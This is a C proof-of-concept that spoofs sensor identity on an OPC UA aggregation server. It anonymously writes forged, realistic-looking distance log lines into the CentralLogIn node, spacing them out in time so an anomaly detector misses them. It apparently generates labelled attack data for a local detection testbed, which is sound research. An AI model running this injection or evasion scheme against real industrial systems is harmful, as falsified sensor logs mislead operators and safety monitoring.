// =============================================================================
// STRIDE - S (Spoofing / 欺騙) 攻擊 PoC
// =============================================================================
// 目標：aggregation_server@4840 的 CentralLogIn 節點（scalar String 寫入口）。
//
// 弱點：aggregation_server 用 UA_ServerConfig_setDefault，只開 SecurityPolicy#None
//       且 allowAnonymous。任何匿名 client 都能建立 session 並寫 CentralLogIn，
//       server 端「完全不驗證來源身分」——它預設寫入者就是合法的 sensor/motor。
//
// 手法（高隱蔽稀疏注入）：本程式冒充 sensor，用與真實 log 一模一樣的格式
//       （時間戳 + info/application + [Sensor] 前綴）寫入偽造 log。
//       這些假 log 會被 append 進 CentralLog ring buffer，Anomaly_client 訂閱後
//       會把它們當成真實節點回報的內容收下——這就是「冒充合法身分」。
//
// 隱蔽設計（相對舊版的改進）：
//   1. 稀疏：整段只注入 N_INJECT 筆，在 baseline 期間「隨機時間點」散佈，
//      平均每 ~20 秒才一筆，埋進每秒一筆的正常流量裡（異常密度約 5%）。
//   2. 不成對：只冒充 sensor 一種身分、一次一筆，不再 sensor+motor 成對出現
//      （成對出現本身就是可辨識的規律）。
//   3. 值擬真：假距離在真實量程 [2,50] 內用亂數生成、帶完整隨機小數，
//      消除舊版「固定 33.300000、6 位小數全 0」這個一眼可辨的破綻。
//   4. 不固定間隔：注入時點用亂數抖動，避免等間隔這種週期性特徵。
//
// 觀察重點：跑完後看 Anomaly_client 的輸出，偽造行稀疏地混在大量真 log 之間，
//       外觀與數值都難以區分。破綻只剩極細微的語意線索（例如某一秒出現兩筆
//       [Sensor] Updated distance），偵測需要跨行的語意/統計關聯。
//
// ⚠️ 僅用於你自己機器上、你自己系統的授權安全測試。
// =============================================================================
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <open62541/client_config_default.h>
#include <open62541/client_highlevel.h>

// ---- 可調參數 ----
#ifndef N_INJECT
#define N_INJECT        5      // 整段共注入幾筆假 log
#endif
#ifndef BASELINE_SEC
#define BASELINE_SEC    300    // 潛伏總時長（秒），與正常流量並行
#endif
#define DIST_MIN        2.0    // 假距離下界（貼合真實 sensor 量程）
#define DIST_MAX        50.0   // 假距離上界

static volatile UA_Boolean running = true;
static void stopHandler(int sig) { (void)sig; running = false; }

// 組出一行「與真實 customLogger 輸出格式完全相同」的 log 字串。
// 真實格式： [YYYY-MM-DD HH:MM:SS.mmm (UTC)] <level>/<cat>\t<msg>
static void build_fake_log(char *out, size_t outlen, const char *level,
                           const char *cat, const char *msg) {
    UA_DateTimeStruct dts = UA_DateTime_toStruct(UA_DateTime_now());
    snprintf(out, outlen, "[%04u-%02u-%02u %02u:%02u:%02u.%03u (UTC)] %s/%s\t%s",
             dts.year, dts.month, dts.day, dts.hour, dts.min, dts.sec,
             dts.milliSec, level, cat, msg);
}

// 把一行 log 冒充寫進 CentralLogIn（server 會 append 進 CentralLog）。
static UA_StatusCode inject_log(UA_Client *client, const char *line) {
    UA_Variant v;
    UA_String s = UA_STRING((char *)line);
    UA_Variant_setScalar(&v, &s, &UA_TYPES[UA_TYPES_STRING]);
    return UA_Client_writeValueAttribute(client, UA_NODEID_STRING(1, "CentralLogIn"), &v);
}

int main(int argc, char **argv) {
    // 可選參數 sensor_id（>=1）：偽造哪一個 sensor 的距離報告。
    //   多 pair 拓樸下，spoof 要能指定打哪一組 pair，否則偽造內容永遠自稱 "Sensor"
    //   （pair1），三份並行實例會全部堆在 pair1（見 collect_topo3.sh 的 $k）。
    //   sensor_id=1 → SourceName "Sensor"（與改造前一字不差）；i>=2 → "Sensor<i>"。
    // ⚠ 這只改『偽造內容自稱的身分』（parser 讀到的 lr_SourceName）。SourceNode 仍由
    //   server 依 session 蓋章 —— 匿名注入照樣是 unverified，孤兒規則不受影響。
    int sensor_id = 1;
    if (argc > 1) {
        sensor_id = atoi(argv[1]);
        if (sensor_id < 1) { fprintf(stderr, "用法: %s [sensor_id>=1]\n", argv[0]); return 2; }
    }
    char srcname[32];
    if (sensor_id == 1) snprintf(srcname, sizeof(srcname), "Sensor");
    else                snprintf(srcname, sizeof(srcname), "Sensor%d", sensor_id);

    // stdout 導向檔案時預設是 full-buffer；本程式常被上層腳本 kill -9 收尾，
    // 未 flush 的 buffer（含所有 injected 記錄）會整段遺失 → 下游標不到 ground
    // truth。改成行緩衝，確保每筆注入即時落盤，即使被硬殺也不丟。
    setvbuf(stdout, NULL, _IOLBF, 0);

    signal(SIGINT, stopHandler);
    signal(SIGTERM, stopHandler);

    UA_Client *client = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(client));

    printf("[SPOOF] Connecting to aggregation_server@4840 (anonymous, no auth)...\n");
    UA_StatusCode rc = UA_Client_connect(client, "opc.tcp://127.0.0.1:4840");
    if (rc != UA_STATUSCODE_GOOD) {
        printf("[SPOOF] Connect failed: %s\n", UA_StatusCode_name(rc));
        UA_Client_delete(client);
        return 1;
    }
    printf("[SPOOF] Connected. Lurking for %d s, sparsely injecting %d fake logs...\n",
           BASELINE_SEC, N_INJECT);

    srand((unsigned)time(NULL) ^ 0x5eed);

    // 先在 [0, BASELINE_SEC) 內隨機抽 N_INJECT 個「注入時點」（秒），並排序。
    // 用隨機時點而非固定間隔，避免週期性特徵；平均每 ~BASELINE_SEC/N_INJECT 秒一筆。
    int inject_at[N_INJECT];
    for (int i = 0; i < N_INJECT; i++)
        inject_at[i] = rand() % BASELINE_SEC;
    // 簡單插入排序（N 很小）
    for (int i = 1; i < N_INJECT; i++) {
        int key = inject_at[i], j = i - 1;
        while (j >= 0 && inject_at[j] > key) { inject_at[j + 1] = inject_at[j]; j--; }
        inject_at[j + 1] = key;
    }

    time_t start = time(NULL);
    int next = 0;              // 下一個要觸發的注入索引
    char line[1024];

    while (running) {
        int elapsed = (int)(time(NULL) - start);
        if (elapsed >= BASELINE_SEC) break;

        // 到了某個排定時點就注入一筆（可能同一秒排到多筆，一次處理完）
        while (next < N_INJECT && inject_at[next] <= elapsed) {
            // 假距離：真實量程內的亂數 + 完整隨機小數，擬真、無固定值破綻。
            double fake_dist = DIST_MIN + ((double)rand() / RAND_MAX) * (DIST_MAX - DIST_MIN);
            char msg[256];
            snprintf(msg, sizeof(msg), "[Sensor] Updated distance: %.15g cm", fake_dist);
            build_fake_log(line, sizeof(line), "info", "application", msg);
            // 附上與真實 sensor 完全相同的 LogRecord 後綴（見 sensor_pub.c 的 full_log），
            // 讓偽造行帶上目標 pair 的 SourceName —— 否則 parser 只能從 "[Sensor]" 前綴
            // 退回 "Sensor"（pair1）。info 級距 Severity=75、EventType=application。
            size_t L = strlen(line);
            snprintf(line + L, sizeof(line) - L,
                     " | Severity=75 | SourceName=%s | EventType=application", srcname);
            inject_log(client, line);
            printf("[SPOOF] t=%ds injected (as %s): %s\n", elapsed, srcname, line);
            next++;
        }

        UA_Client_run_iterate(client, 0);
        usleep(200000);   // 200ms 一輪，低調、不製造流量特徵
    }

    printf("[SPOOF] Done (%d/%d injected). Disconnecting.\n", next, N_INJECT);
    UA_Client_disconnect(client);
    UA_Client_delete(client);
    return 0;
}
